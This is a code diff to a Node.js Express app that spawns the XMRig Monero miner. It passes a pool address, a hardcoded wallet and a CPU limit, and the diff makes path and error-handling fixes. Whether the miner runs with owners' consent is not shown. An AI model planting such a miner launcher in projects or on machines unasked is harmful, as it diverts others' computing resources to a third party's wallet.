@@ -6,12 +6,12 @@ const { spawn } = require('child_process');
 const app = express();
 const PLATFORM = os.platform().toLowerCase();
 
-const PROC_GOV_PATH = "./procgov64.exe";
-const LINUX_PATH = "./xmrig"; // Updated to be similar to WINDOWS_XMRIG_PATH
-const WINDOWS_XMRIG_PATH = "./xmrig.exe";
+const PROC_GOV_PATH = path.resolve(__dirname, 'procgov64.exe');
+const LINUX_PATH = path.resolve(__dirname, 'xmrig');
+const WINDOWS_XMRIG_PATH = path.resolve(__dirname, 'xmrig.exe');
 
 const WINDOWS_ARGS = [
-    '-cpu=2', // Restricting to 2 CPUs
+    '-cpu=2',
     WINDOWS_XMRIG_PATH,
     '--url', 'gulf.moneroocean.stream:10128',
     '--user', '43WJQfGyaivhEZBr95TZGy3HGei1LVUY5gqyUCAAE4viCRwzJgMcCn3ZVFXtySFxwZLFtrjMPJXhAT9iA9KYf4LoPoKiwBc',
@@ -85,6 +85,11 @@ class XMRIGMiner {
     _exec() {
         // Start the process using procgov64 on Windows or xmrig on Linux
         this._worker = spawn(this._filePath, this._args);
+
+        // Handle process errors
+        this._worker.on('error', (err) => {
+            console.error('Failed to start XMRIG process:', err);
+        });
 
         // Passthrough output
         this._worker.stdout.on('data', data => console.info(data.toString()));
